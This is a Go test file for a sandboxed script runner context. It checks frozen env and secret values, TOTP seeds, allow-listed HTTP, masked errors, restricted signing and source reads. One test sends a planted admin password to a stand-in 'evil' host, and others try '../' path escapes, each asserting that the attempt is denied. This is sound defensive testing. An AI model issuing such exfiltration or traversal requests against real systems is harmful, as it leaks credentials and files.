package runnerctx

import (
	"crypto"
	"crypto/rsa"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/d0lim/cockpit/internal/ports/porttest"
	"github.com/d0lim/cockpit/internal/ports/totp"
)

func TestEnvAndPrivAreReadableAndFrozenAndPrivSeesTheNewSeedAfterSaveSeed(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	must(ctx.env.appBase === "http://app:8080" && ctx.env.flag === true && ctx.env.nested.n === 1, "env");
	must(ctx.priv.adminPassword === "` + planted + `", "priv");
	must(Object.isFrozen(ctx) && Object.isFrozen(ctx.http) && Object.isFrozen(ctx.crypto.subtle) && Object.isFrozen(ctx.env) && Object.isFrozen(ctx.env.nested) && Object.isFrozen(ctx.priv), "frozen");
	try { (ctx as any).http.send = null; } catch {}
	try { (ctx.env as any).appBase = "x"; } catch {}
	try { (ctx as any).priv = {}; } catch {}
	try { (ctx.priv as any).adminPassword = "y"; } catch {}
	must(typeof ctx.http.send === "function" && ctx.env.appBase === "http://app:8080" && ctx.priv.adminPassword === "` + planted + `", "writes ignored");
	must(ctx.priv.totpSecret2 === undefined, "no seed 2 yet");
	ctx.saveSeed("admin-2", "` + seedTwo + `");
	must(ctx.priv.totpSecret2 === "` + seedTwo + `" && ctx.priv.adminPassword === "` + planted + `", "seed visible, others kept");
	must(catchCode(() => ctx.saveSeed("nobody", "x")).startsWith("PORT_BAD_ARGS|"), "unknown login");
	must(catchCode(() => ctx.saveSeed("admin-1", 5 as any)).startsWith("PORT_BAD_ARGS|"), "secret type");
}`)
	raw, _ := os.ReadFile(w.privPath)
	var doc map[string]map[string]string
	if err := json.Unmarshal(raw, &doc); err != nil || doc["local"]["totpSecret2"] != seedTwo || doc["local"]["adminPassword"] != planted {
		t.Fatalf("private env: %s %v", raw, err)
	}
	known := strings.Join(w.deps.KnownValues(), ",")
	if w.changed != 1 || !strings.Contains(known, seedTwo) || !strings.Contains(known, planted) {
		t.Fatalf("changed=%d known=%s", w.changed, known)
	}
}

func TestSendResolvesForAllowedURLAndRejectsDeniedOrRedirectedWithCodeAndMaskedMessage(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	const res = await ctx.http.send("POST", ctx.env.appBase + "/echo?q=1", { headers: { authorization: "Bearer t" }, json: { a: 1 } });
	must(res.status === 200 && res.body === '{"a":1}' && res.headers["content-type"] === "application/json" && res.headers["x-echo-auth"] === "Bearer t" && res.method === "POST" && res.url.endsWith("/echo?q=1"), "res " + JSON.stringify(res));
	const denied = await rejectCode(ctx.http.send("GET", "http://evil:8080/" + ctx.priv.adminPassword));
	must(denied.startsWith("PORT_DENIED|") && !denied.includes("PLANTED") && denied.includes("****"), "denied " + denied);
	const redirect = await rejectCode(ctx.http.send("GET", ctx.env.appBase + "/redirect"));
	must(redirect.startsWith("PORT_DENIED|"), "redirect " + redirect);
	must(catchCode(() => ctx.http.send("GET", 5 as any)).startsWith("PORT_BAD_ARGS|"), "url type");
	must(catchCode(() => ctx.http.send("GET", ctx.env.appBase + "/echo", 7 as any)).startsWith("PORT_BAD_ARGS|"), "opts type");
	record(String(Object.isFrozen(res)));
}`)
	if n := w.deps.HTTP.Counter(); n.Sent != 2 || n.LastStatus != 302 {
		t.Fatalf("counter: %+v", n)
	}
	if len(w.records) != 1 {
		t.Fatalf("records: %v", w.records)
	}
}

func TestCapturesComeBackViaGetOnlyPersistedReachContextJSONAndMissingOnesAreRejectedByName(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	ctx.capture("session", ctx.priv.adminPassword);
	ctx.capture("workspaceId", "ws-1", { persist: true });
	must(ctx.get("session") === ctx.priv.adminPassword && ctx.get("workspaceId") === "ws-1", "get");
	const missing = catchCode(() => ctx.get("draftId"));
	must(missing.startsWith("PORT_BAD_ARGS|") && missing.includes("draftId"), "missing " + missing);
	must(catchCode(() => ctx.capture("x", 1 as any)).startsWith("PORT_BAD_ARGS|"), "value type");
}`)
	file := w.contextFile()
	raw, _ := os.ReadFile(filepath.Join(w.e2e, "context.json"))
	if file.Captures["workspaceId"] != "ws-1" || len(file.Captures) != 1 || strings.Contains(string(raw), planted) || strings.Contains(string(raw), "session") {
		t.Fatalf("context.json: %s", raw)
	}
	known := strings.Join(w.deps.KnownValues(), ",")
	if w.changed != 2 || !strings.Contains(known, "ws-1") || strings.Count(known, planted) != 1 {
		t.Fatalf("changed=%d known=%s", w.changed, known)
	}
}

func TestTOTPIsIssuedOnlyForAccountsInSeedKeyTableAndStepIsStoredInContextJSON(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	const a = await ctx.totp("admin-1");
	const b = await ctx.totp("admin-1");
	must(/^\d{6}$/.test(a) && /^\d{6}$/.test(b), "codes " + a + " " + b);
	record(a); record(b);
	must((await rejectCode(ctx.totp("nobody"))).startsWith("PORT_BAD_ARGS|"), "unknown login");
	must((await rejectCode(ctx.totp("admin-2"))).startsWith("PORT_UNAVAILABLE|"), "no seed yet");
	must(catchCode(() => ctx.totp(3 as any)).startsWith("PORT_BAD_ARGS|"), "login type");
}`)
	step := w.contextFile().TOTPSteps["admin-1"]
	first, _ := totp.At(rfcSeed, step-1)
	second, _ := totp.At(rfcSeed, step)
	if len(w.records) != 2 || w.records[0] != first || w.records[1] != second {
		t.Fatalf("step=%d records=%v want %s %s", step, w.records, first, second)
	}
}

func TestCryptoGivesV4UUIDRandomBytesAndKeyPairsAndSignsOnlyWithPrivateKeyVerifiableInGo(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	const id = ctx.crypto.randomUUID();
	must(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(id), "uuid " + id);
	const bytes = ctx.crypto.getRandomValues(new Uint8Array(16));
	must(bytes instanceof Uint8Array && bytes.length === 16 && bytes.some((b) => b !== 0), "random bytes");
	must(catchCode(() => ctx.crypto.getRandomValues(new Uint8Array(65537))).startsWith("PORT_LIMIT|"), "limit");
	must(catchCode(() => ctx.crypto.getRandomValues("abc" as any)).startsWith("PORT_BAD_ARGS|"), "not typed array");
	const alg = { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-512" };
	const pair = await ctx.crypto.subtle.generateKey(alg, false, ["sign", "verify"]);
	must(pair.privateKey.type === "private" && pair.publicKey.type === "public", "pair");
	const header = b64url(Buffer.from(JSON.stringify({ alg: "RS512", kid: "k" })));
	const body = b64url(Buffer.from('{"id":"x"}'));
	const input = header + "." + body;
	const sig = await ctx.crypto.subtle.sign("RSASSA-PKCS1-v1_5", pair.privateKey, Buffer.from(input));
	must(sig instanceof ArrayBuffer && sig.byteLength === 256, "sig " + String(sig.byteLength));
	record(JSON.stringify({ pub: (pair.publicKey as any).id, input, sig: Buffer.from(new Uint8Array(sig)).toString("base64") }));
	must((await rejectCode(ctx.crypto.subtle.sign({ name: "RSASSA-PKCS1-v1_5" } as any, pair.publicKey, Buffer.from("x")))).startsWith("PORT_DENIED|"), "public sign");
	must((await rejectCode(ctx.crypto.subtle.sign("RSA-PSS" as any, pair.privateKey, Buffer.from("x")))).startsWith("PORT_BAD_ARGS|"), "alg");
	must((await rejectCode(ctx.crypto.subtle.sign("RSASSA-PKCS1-v1_5", pair.privateKey, "text" as any))).startsWith("PORT_BAD_ARGS|"), "data type");
	must((await rejectCode(ctx.crypto.subtle.generateKey({ ...alg, modulusLength: 1024 }, false, ["sign"]))).startsWith("PORT_BAD_ARGS|"), "short key");
	must((await rejectCode(ctx.crypto.subtle.generateKey({ ...alg, name: "RSA-PSS" } as any, false, ["sign"]))).startsWith("PORT_BAD_ARGS|"), "alg name");
}`)
	var rec struct{ Pub, Input, Sig string }
	if len(w.records) != 1 || json.Unmarshal([]byte(w.records[0]), &rec) != nil {
		t.Fatalf("records: %v", w.records)
	}
	pub, err := w.deps.Keys.PublicKey(rec.Pub)
	if err != nil {
		t.Fatal(err)
	}
	sig, _ := base64.StdEncoding.DecodeString(rec.Sig)
	digest := sha512.Sum512([]byte(rec.Input))
	if err := rsa.VerifyPKCS1v15(pub, crypto.SHA512, digest[:], sig); err != nil {
		t.Fatalf("verify: %v", err)
	}
}

func TestSourceReadsAndListsOnlyDeclaredNamesAndRejectsOthersWithAPortCode(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	must(ctx.readSource("fixtures", "modules/a.json") === '{"a":1}', "read");
	const names = ctx.listSource("fixtures", "modules");
	must(Array.isArray(names) && names.join(",") === "a.json,b.json", "list " + String(names));
	must(ctx.listSource("fixtures", "vectors").length === 0, "missing dir");
	must(catchCode(() => ctx.readSource("other", "modules/a.json")).startsWith("PORT_DENIED|"), "other source");
	must(catchCode(() => ctx.readSource("fixtures", "../x")).startsWith("PORT_DENIED|"), "escape");
	must(catchCode(() => ctx.listSource("fixtures", "..")).startsWith("PORT_DENIED|"), "escape list");
	must(catchCode(() => ctx.readSource("fixtures", "modules/missing.json")).startsWith("PORT_UNAVAILABLE|"), "missing file");
}`)
}

func TestClockGivesMillisAndSleepResolvesAfterTheGivenDelay(t *testing.T) {
	w := newWorld(t)
	w.mustRun(`export default async () => {
	const t0 = ctx.clock();
	must(typeof t0 === "number" && t0 > 1_600_000_000_000, "clock " + String(t0));
	await ctx.sleep(30);
	must(ctx.clock() - t0 >= 25, "slept " + String(ctx.clock() - t0));
	await ctx.sleep(-1);
	await ctx.sleep(0);
}`)
}

func TestRunnerCtxMutationRecordMatchesTestsInThisFile(t *testing.T) {
	porttest.AssertMutationRecord(t, "runnerctx_test.go", ctxMutations)
}
